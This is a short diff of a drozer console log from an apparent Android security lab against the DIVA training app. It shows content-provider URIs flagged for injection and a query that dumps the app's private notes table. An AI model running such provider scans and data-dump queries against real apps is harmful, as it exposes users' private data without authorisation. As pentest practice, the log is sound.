@@ -1,4 +1,4 @@
-root@ubuntu-server:~# 
+root@ubuntu-server:~# drozer console connect
 Selecting 86a5cfb714c63aba (unknown SSL PINNING TWITTER 7.0)
 
             ..                    ..:.
@@ -30,6 +30,8 @@ Injection in Projection:
 Injection in Selection:
   content://jakhar.aseem.diva.provider.notesprovider/notes/
   content://jakhar.aseem.diva.provider.notesprovider/notes
+  
+  
 dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/ --projection "*"
 | _id | title    | note                                 |
 | 5   | Exercise | Alternate days running               |
@@ -38,5 +40,3 @@ dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/no
 | 3   | holiday  | Either Goa or Amsterdam              |
 | 2   | home     | Buy toys for baby, Order dinner      |
 | 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
-
-dz>
